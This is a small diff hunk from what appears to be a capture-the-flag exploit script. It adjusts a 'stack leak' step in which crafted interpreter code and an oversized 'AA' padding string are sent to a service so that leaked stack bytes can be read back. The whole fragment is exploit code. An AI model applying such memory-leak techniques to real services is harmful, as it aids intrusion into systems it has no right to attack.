@@ -47,8 +47,8 @@ if REMOTE:
 
 else:
   # stack leak
-  Interpret_code(".,[>.,]"+ ">."*0x10)
-  s.sendline("AA"*0x800+"\x00")
+  Interpret_code(".,[>.,]")
+  s.sendline("AA"*0x810+"\x00")
 
   s.recvuntil("Output: " + "\x00"*0x800)
   s.recv(8)
